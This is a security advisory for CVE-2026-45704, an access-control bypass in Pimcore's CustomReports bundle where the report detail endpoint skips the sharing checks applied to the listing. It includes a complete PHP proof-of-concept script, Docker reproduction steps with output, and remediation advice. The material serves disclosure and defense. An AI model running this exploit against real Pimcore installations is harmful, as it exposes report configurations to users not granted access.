# [H] Pimcore has a CustomReports Share Bypass

## Summary
Severity: High
Advisory: GHSA-jwcc-gv4m-93x6
CVE: CVE-2026-45704
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-jwcc-gv4m-93x6
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=12.0.0-RC1 <12.3.6
- Packagist: `pimcore/pimcore` — affected >=0 <11.5.17
- Packagist: `pimcore/pimcore` — affected >=2026.1.0 <2026.1.2

## Details
### Summary

`CustomReports` uses inconsistent authorization between the report listing endpoint and the report detail endpoint.

- The listing flow filters reports based on report-sharing rules
- The detail flow only checks generic `reports` or `reports_config` permissions

As a result, a low-privileged backend user who was not granted access to a report can still read that report directly by name even though it does not appear in the user's visible report list.

In the local Docker reproduction:

- The report `poc-secret-report` was not visible to the low-privileged user in the report list
- The same user was still able to retrieve the report configuration directly by name

### Root Cause

The listing flow in `getReportConfigAction()` filters reports through `loadForGivenUser()`:

- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L245)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L252)#L245)
- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L253)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L252)
- [CustomReportController.php](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L253)
- [[Config/Listing/Dao.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Tool/Config/Listing/Dao.php#L44)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Tool/[Config/Listing/Dao.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Tool/Config/Listing/Dao.php#L52)#L44)
- [Config/Listing/Dao.php](pimcore-12.3.3/bundles/CustomReportsBundle/src/Tool/Config/Listing/Dao.php#L52)

However, `getAction()` only checks generic permissions and then loads the report directly by name:

- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L146)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L149)#L146)
- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L151)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L155)#L149)
- [CustomReportController.php](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L151)
- [CustomReportController.php](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L155)

This means the same report object is protected by different authorization models depending on which endpoint is used. The result is a classic "not visible in list, but readable by direct request" access-control bypass.

### Impact

An attacker can read sensitive report metadata without authorization, including:

- Report name
- Grouping information
- Display and icon metadata
- Data source configuration
- Column configuration
- Sharing settings

From the source code, other report endpoints such as `data`, `chart`, `create-csv`, and `download-csv` also resolve reports by name in a similar way:

- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L275)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L284)#L275)
- [[CustomReportController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L313)](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L284)
- [CustomReportController.php](pimcore-12.3.3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L313)

This report only treats unauthorized report-config retrieval as reproduced. The other execution paths should be verified separately.

### Preconditions

- The attacker is an authenticated backend user
- The attacker has the `reports` permission
- The target report is not globally shared and is not shared with that user or the user's roles

### PoC

```php
<?php
declare(strict_types=1);

use Pimcore\Bundle\CustomReportsBundle\Controller\Reports\CustomReportController;
use Pimcore\Controller\UserAwareController;
use Pimcore\Model\User;
use Pimcore\Model\Tool\SettingsStore;
use Pimcore\Security\User\TokenStorageUserResolver;
use Pimcore\Security\User\User as SecurityUser;
use Pimcore\Serializer\Serializer as PimcoreSerializer;
use Pimcore\Tool\Authentication;
use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorage;

require dirname(__DIR__) . '/vendor/autoload.php';

define('PIMCORE_PROJECT_ROOT', dirname(__DIR__));

try {
    \Pimcore\Bootstrap::bootstrap();

    $kernel = new \App\Kernel('dev', true);
    \Pimcore::setKernel($kernel);
    $kernel->boot();

    $container = $kernel->getContainer();

    /** @var RequestStack $requestStack */
    $requestStack = getService($container, [
        RequestStack::class,
        'request_stack',
    ]);

    $admin = User::getByName('admin');
    if (!$admin instanceof User) {
        fail('admin user is missing');
    }

    $auditor = User::getByName('auditor_customreports');
    if (!$auditor instanceof User) {
        $auditor = new User();
        $auditor->setParentId(0);
        $auditor->setName('auditor_customreports');
    }

    $auditor->setAdmin(false);
    $auditor->setActive(true);
    $auditor->setPassword(Authentication::getPasswordHash('auditor_customreports', 'auditor-pass'));
    $auditor->setPermissions(['reports']);
    $auditor->setRoles([]);
    $auditor->save();

    $timestamp = time();
    SettingsStore::set(
        'poc-secret-report',
        json_encode([
            'name' => 'poc-secret-report',
            'niceName' => 'PoC Secret Report',
            'group' => 'Audit',
            'dataSourceConfig' => [['type' => 'sql']],
            'columnConfiguration' => [],
            'shareGlobally' => false,
            'sharedUserNames' => ['admin'],
            'sharedRoleNames' => [],
            'menuShortcut' => true,
            'creationDate' => $timestamp,
            'modificationDate' => $timestamp,
        ], JSON_THROW_ON_ERROR),
        SettingsStore::TYPE_STRING,
        'pimcore_custom_reports'
    );

    $tokenResolver = buildTokenResolver($auditor);
    $controller = wireController(new CustomReportController(), $container, $tokenResolver);

    $listRequest = new Request();
    $requestStack->push($listRequest);
    $listResponse = $controller->getReportConfigAction($listRequest);
    $requestStack->pop();
    $listData = json_decode($listResponse->getContent(), true, 512, JSON_THROW_ON_ERROR);

    $getRequest = new Request(['name' => 'poc-secret-report']);
    $requestStack->push($getRequest);
    $getResponse = $controller->getAction($getRequest);
    $requestStack->pop();
    $getData = json_decode($getResponse->getContent(), true, 512, JSON_THROW_ON_ERROR);

    $listedNames = array_map(static fn (array $item): string => $item['name'], $listData['reports'] ?? []);

    echo json_encode([
        'vulnerability' => 'customreports_share_bypass',
        'user' => [
            'id' => $auditor->getId(),
            'name' => $auditor->getName(),
            'permissions' => $auditor->getPermissions(),
        ],
        'target_report' => [
            'name' => 'poc-secret-report',
            'shared_to' => ['admin'],
            'share_globally' => false,
        ],
        'result' => [
            'report_visible_in_list' => in_array('poc-secret-report', $listedNames, true),
            'listed_report_names' => $listedNames,
            'direct_get_returned_name' => $getData['name'] ?? null,
            'direct_get_shared_user_names' => $getData['sharedUserNames'] ?? null,
        ],
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), PHP_EOL;
} catch (Throwable $e) {
    fail(sprintf(
        '%s: %s in %s:%d%s',
        $e::class,
        $e->getMessage(),
        $e->getFile(),
        $e->getLine(),
        $e->getTraceAsString() ? PHP_EOL . $e->getTraceAsString() : ''
    ));
}

function wireController(
    UserAwareController $controller,
    ContainerInterface $container,
    TokenStorageUserResolver $tokenResolver
): UserAwareController
{
    $controller->setContainer($container);
    $controller->setTokenResolver($tokenResolver);

    if (method_exists($controller, 'setPimcoreSerializer')) {
        /** @var PimcoreSerializer $serializer */
        $serializer = getService($container, [
            PimcoreSerializer::class,
            'Pimcore\\Serializer\\Serializer',
        ]);
        $controller->setPimcoreSerializer($serializer);
    }

    return $controller;
}

function buildTokenResolver(User $user): TokenStorageUserResolver
{
    $tokenStorage = new TokenStorage();
    $proxyUser = new SecurityUser($user);
    $token = new UsernamePasswordToken($proxyUser, 'pimcore_admin', $proxyUser->getRoles());
    $tokenStorage->setToken($token);

    return new TokenStorageUserResolver($tokenStorage);
}

function getService(ContainerInterface $container, array $ids): mixed
{
    foreach ($ids as $id) {
        try {
            if ($container->has($id)) {
                return $container->get($id);
            }
        } catch (Throwable) {
        }
    }

    fail('Unable to resolve service: ' . implode(', ', $ids));
}

function fail(string $message): never
{
    fwrite(STDERR, $message . PHP_EOL);
    exit(1);
}

```



### Reproduction Steps

1. Create a low-privileged user named `auditor_customreports` with the `reports` permission.
2. Create a report named `poc-secret-report` with:
   - `shareGlobally = false`
   - `sharedUserNames = ['admin']`
3. As `auditor_customreports`, request the visible report list and verify that `poc-secret-report` is absent.
4. As the same user, call `getAction(name=poc-secret-report)` directly.
5. Verify that the response still contains the report configuration.

Reproduction command:

```bash
cd pimcore-12.3.3-repro
docker compose exec -T php php poc_customreports.php
```

### Reproduction Result

Relevant PoC output:

```json
{
  "vulnerability": "customreports_share_bypass",
  "user": {
    "name": "auditor_customreports",
    "permissions": [
      "reports"
    ]
  },
  "target_report": {
    "name": "poc-secret-report",
    "shared_to": [
      "admin"
    ],
    "share_globally": false
  },
  "result": {
    "report_visible_in_list": false,
    "listed_report_names": [],
    "direct_get_returned_name": "poc-secret-report",
    "direct_get_shared_user_names": [
      "admin"
    ]
  }
}
```

This shows that:

- The current user cannot see the report in the visible report list
- The same user can still retrieve the report configuration directly

This confirms that the share-bypass issue is practically exploitable.

### Security Impact

- Unauthorized disclosure of report configuration
- Disclosure of sharing scope and internal report structure
- Potential leakage of data-source and query organization details
- Useful reconnaissance for follow-on unauthorized execution or export paths

### Remediation

1. Add object-level sharing checks to `getAction()` equivalent to `loadForGivenUser()`.
2. Centralize authorization into a single "can current user access this report?" function reused by `get`, `data`, `chart`, `create-csv`, and `download-csv`.
3. Return `403` for unshared reports.
4. Add regression tests to ensure that users with `reports` permission but without report-sharing access cannot retrieve report details.

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-jwcc-gv4m-93x6
- https://github.com/pimcore/pimcore/pull/19099
- https://github.com/pimcore/pimcore/commit/1893ff1cd116e442b995ddf17e8c6e0aa372268e
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/pimcore/releases/tag/v12.3.6
